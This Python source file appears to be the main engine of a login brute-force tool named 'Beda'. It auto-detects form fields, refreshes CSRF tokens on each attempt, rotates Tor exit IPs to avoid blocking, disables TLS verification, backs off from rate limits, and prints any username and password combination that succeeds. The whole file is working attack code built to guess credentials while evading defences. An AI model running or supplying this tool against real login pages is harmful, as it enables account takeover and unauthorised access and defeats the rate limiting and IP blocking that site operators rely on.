import requests
import urllib3
import time
from rich.console import Console
from analyzer import analyze_form, detect_success, detect_rate_limit
from tor_manager import get_tor_proxies, change_ip, get_current_ip

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()


def run_brute(url, username, wordlist, user_field=None, pass_field=None,
              success_text=None, fail_text=None, rotate_every=2,
              use_tor=False, delay=0, timeout=5, verbose=False,
              extra_headers=None, extra_data=None):
    """
    Main brute force engine for Beda.
    Returns result dict or None.
    """

    # ── Load wordlist ──
    try:
        with open(wordlist, "r", errors="ignore") as f:
            passwords = [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        console.print(f"[red]❌ Wordlist not found: {wordlist}[/red]")
        return None

    proxies = get_tor_proxies() if use_tor else None

    # ── Session ──
    session = requests.Session()
    session.verify = False
    if extra_headers:
        session.headers.update(extra_headers)

    # ── Auto-detect form ──
    console.print(f"\n  [cyan][BEDA] Analyzing login form...[/cyan]")
    form = analyze_form(url, session, timeout=timeout)

    if not form:
        console.print(f"  [red][BEDA] Could not analyze form — use --user-field and --pass-field[/red]")
        return None

    # Override if provided
    uf = user_field or form["user_field"] or "username"
    pf = pass_field or form["pass_field"] or "password"
    action_url = form["action_url"]

    console.print(f"  [cyan][BEDA] User field  : {uf}[/cyan]")
    console.print(f"  [cyan][BEDA] Pass field  : {pf}[/cyan]")
    console.print(f"  [cyan][BEDA] Action URL  : {action_url}[/cyan]")
    if form["csrf_field"]:
        console.print(f"  [cyan][BEDA] CSRF field  : {form['csrf_field']}[/cyan]")
    if use_tor:
        ip = get_current_ip(proxies)
        console.print(f"  [cyan][BEDA] Tor IP      : {ip}[/cyan]")
    console.print(f"  [cyan][BEDA] Passwords   : {len(passwords)}[/cyan]\n")

    # ── Baseline ──
    baseline_text = None
    try:
        base_data = {uf: username, pf: "wrongpassword_xyz_beda"}
        if form["csrf_field"] and form["csrf_value"]:
            base_data[form["csrf_field"]] = form["csrf_value"]
        if extra_data:
            base_data.update(extra_data)

        baseline = session.post(action_url, data=base_data, timeout=timeout,
                                 proxies=proxies, allow_redirects=True)
        baseline_text = baseline.text[:300]
    except Exception:
        pass

    start = time.time()

    for i, password in enumerate(passwords, 1):

        # ── IP Rotation ──
        if use_tor and i > 1 and (i - 1) % rotate_every == 0:
            change_ip()
            session = requests.Session()
            session.verify = False
            if extra_headers:
                session.headers.update(extra_headers)
            if verbose:
                new_ip = get_current_ip(proxies)
                console.print(f"  [dim][TOR] New IP: {new_ip}[/dim]")

        # ── Re-fetch CSRF ──
        csrf_value = form["csrf_value"]
        if form["csrf_field"]:
            try:
                page = session.get(url, timeout=timeout, proxies=proxies, verify=False)
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(page.text, "html.parser")
                inp = soup.find("input", {"name": form["csrf_field"]})
                if inp:
                    csrf_value = inp.get("value", "")
            except Exception:
                pass

        # ── Build payload ──
        data = {uf: username, pf: password}
        if form["csrf_field"] and csrf_value:
            data[form["csrf_field"]] = csrf_value
        if extra_data:
            data.update(extra_data)

        try:
            response = session.post(
                action_url,
                data=data,
                timeout=timeout,
                proxies=proxies,
                allow_redirects=True,
                verify=False
            )

            # ── Rate limit check ──
            rate = detect_rate_limit(response)
            if rate:
                console.print(f"  [yellow][BEDA] ⚠ {rate} — pausing 5s...[/yellow]")
                time.sleep(5)
                continue

            # ── Success check ──
            if detect_success(response, baseline_text, success_text, fail_text):
                elapsed = round(time.time() - start, 2)
                console.print(f"  [bold green][{i}] {username}:{password} — SUCCESS ✅ (Status: {response.status_code})[/bold green]")
                return {
                    "username": username,
                    "password": password,
                    "attempts": i,
                    "time": elapsed,
                    "url": response.url
                }

            if verbose:
                console.print(f"  [dim][{i}] {username}:{password} — Failed ❌ ({response.status_code})[/dim]")

        except Exception as e:
            if verbose:
                console.print(f"  [dim][{i}] {username}:{password} — Error: {e}[/dim]")
            continue

        if delay > 0:
            time.sleep(delay)

    return None
